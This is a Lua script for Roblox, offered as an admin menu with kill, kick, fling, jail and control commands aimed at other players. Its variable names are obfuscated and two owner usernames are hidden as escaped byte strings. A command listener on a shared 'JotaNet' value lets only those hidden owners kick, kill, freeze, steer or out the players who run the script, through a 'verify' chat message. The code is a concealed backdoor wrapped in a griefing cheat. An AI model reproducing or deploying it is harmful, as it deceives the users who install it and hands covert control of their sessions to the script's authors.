local _0xV = "V42.0"
local _0xK = {
    [1] = "\106\111\116\105\110\104\97\49\50\104\114\50", -- jotinha12hr2
    [2] = "\97\109\105\103\117\105\110\104\111\100\111\104\101\105\116\111", -- amiguinhodoheito
    [3] = "\84\105\109\101\32\100\111\32\74\111\116\105\110\104\97\49\50\104\114\50\32\72\117\98\39\115\32\65\100\109\105\110",
    [4] = "\74\111\116\97\78\101\116"
}

local _0xG = game
local _0xP = _0xG:GetService("Players")
local _0xL = _0xP.LocalPlayer
local _0xR = _0xG:GetService("RunService")
local _0xS = _0xG:GetService("ReplicatedStorage")

local _0xN = _0xS:FindFirstChild(_0xK[4]) or Instance.new("StringValue", _0xS)
_0xN.Name = _0xK[4]

-- [ Função Draggable ]
local function _0xDF(o)
    local d, di, ds, sp
    o.InputBegan:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
            d = true ds = i.Position sp = o.Position
            i.Changed:Connect(function() if i.UserInputState == Enum.UserInputState.End then d = false end end)
        end
    end)
    o.InputChanged:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch then di = i end end)
    _0xR.RenderStepped:Connect(function()
        if d and di then
            local dl = di.Position - ds
            o.Position = UDim2.new(sp.X.Scale, sp.X.Offset + dl.X, sp.Y.Scale, sp.Y.Offset + dl.Y)
        end
    end)
end

-- [ UI Setup ]
local _0xUI = Instance.new("ScreenGui", _0xL:WaitForChild("PlayerGui"))
_0xUI.Name = "JHub_" .. _0xV
_0xUI.ResetOnSpawn = false

local _0xMB = Instance.new("TextButton", _0xUI)
_0xMB.Size, _0xMB.Position = UDim2.new(0,320,0,50), UDim2.new(0.5,-160,0,100)
_0xMB.BackgroundColor3, _0xMB.Text = Color3.fromRGB(20,20,20), "Jotinha12hr2 Hub's Admin " .. _0xV
_0xMB.Font, _0xMB.TextColor3, _0xMB.TextSize = 3, Color3.new(1,1,1), 18
Instance.new("UICorner", _0xMB)
local _0xST = Instance.new("UIStroke", _0xMB) _0xST.Thickness = 3
_0xDF(_0xMB)

local _0xFR = Instance.new("Frame", _0xUI)
_0xFR.Size, _0xFR.Position = UDim2.new(0,260,0,380), UDim2.new(0.5,-130,0.5,-190)
_0xFR.BackgroundColor3, _0xFR.Visible = Color3.fromRGB(15,15,15), false
Instance.new("UICorner", _0xFR)
local _0xFS = Instance.new("UIStroke", _0xFR) _0xFS.Thickness = 2
_0xDF(_0xFR)

-- [ RGB Effect ]
_0xR.Heartbeat:Connect(function()
    local c = Color3.fromHSV(tick()%5/5,1,1)
    _0xST.Color, _0xMB.TextColor3, _0xFS.Color = c, c, c
end)

local _0xBX = Instance.new("TextBox", _0xFR)
_0xBX.Size, _0xBX.Position = UDim2.new(0,220,0,35), UDim2.new(0.5,-110,0,15)
_0xBX.PlaceholderText, _0xBX.BackgroundColor3 = "NICK DO ALVO", Color3.fromRGB(30,30,30)
_0xBX.TextColor3, _0xBX.Text = Color3.new(1,1,1), ""
Instance.new("UICorner", _0xBX)

local _0xSF = Instance.new("ScrollingFrame", _0xFR)
_0xSF.Size, _0xSF.Position, _0xSF.BackgroundTransparency = UDim2.new(1,-10,1,-70), UDim2.new(0,5,0,60), 1
_0xSF.CanvasSize, _0xSF.ScrollBarThickness = UDim2.new(0,0,10,0), 0
Instance.new("UIListLayout", _0xSF).HorizontalAlignment = 1

local _0xCM = {"Verify","Explode","Kill","Void","Freeze","Unfreeze","Jump","Sit","Kick","Spin","Unspin","Blind","Jail","Unjail","Bring","Fling","Infect","View","Unview","Control","Uncontrol"}

for _, name in pairs(_0xCM) do
    local b = Instance.new("TextButton", _0xSF)
    b.Size, b.Text, b.BackgroundColor3 = UDim2.new(0,210,0,35), name:upper(), Color3.fromRGB(40,40,40)
    b.TextColor3, b.Font = Color3.new(1,1,1), 3
    Instance.new("UICorner", b)
    b.MouseButton1Click:Connect(function()
        _0xN.Value = _0xBX.Text .. "|" .. name:lower() .. "|" .. _0xL.Name
        task.wait(0.1) _0xN.Value = ""
    end)
end

_0xMB.MouseButton1Click:Connect(function() _0xFR.Visible = not _0xFR.Visible end)

-- [ Command Listener ]
_0xN.Changed:Connect(function(v)
    if v == "" then return end
    local s = string.split(v, "|")
    if (s[1]:lower() == _0xL.Name:lower() or s[1] == "all") and (s[3] == _0xK[1] or s[3] == _0xK[2]) then
        local c, ch = s[2], _0xL.Character
        if ch and ch:FindFirstChild("HumanoidRootPart") then
            local hum = ch.Humanoid
            local root = ch.HumanoidRootPart
            if c == "kick" then _0xL:Kick(_0xK[3])
            elseif c == "kill" then hum.Health = 0
            elseif c == "jail" then _G.Locked = true _G.JailPos = root.CFrame
            elseif c == "unjail" then _G.Locked = false _G.JailPos = nil
            elseif c == "bring" then local p2 = _0xP:FindFirstChild(s[3]) if p2 and p2.Character then root.CFrame = p2.Character.HumanoidRootPart.CFrame end
            elseif c == "fling" then hum.PlatformStand = true root.Velocity = Vector3.new(0, 9999, 0)
            elseif c == "control" then _G.M_Tr = s[3]
            elseif c == "uncontrol" then _G.M_Tr = nil
            elseif c == "freeze" then root.Anchored = true
            elseif c == "unfreeze" then root.Anchored = false
            elseif c == "explode" then Instance.new("Explosion", ch).Position = root.Position
            elseif c == "sit" then hum.Sit = true
            elseif c == "jump" then hum.Jump = true
            elseif c == "void" then root.CFrame = CFrame.new(0,-500,0)
            elseif c == "verify" then _0xS.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("jotinha_#####", "All")
            end
        end
    end
end)

-- [ Heartbeat Loops ]
_0xR.Heartbeat:Connect(function()
    if _G.Locked and _G.JailPos and _0xL.Character and _0xL.Character:FindFirstChild("HumanoidRootPart") then
        _0xL.Character.HumanoidRootPart.CFrame = _G.JailPos
    end
    if _G.M_Tr then
        local t = _0xP:FindFirstChild(_G.M_Tr)
        if t and t.Character and _0xL.Character then
            _0xL.Character.Humanoid:Move(t.Character.Humanoid.MoveDirection, false)
            if t.Character.Humanoid.Jump then _0xL.Character.Humanoid.Jump = true end
        end
    end
end)

print("JotinhaHub " .. _0xV .. " Loaded!")
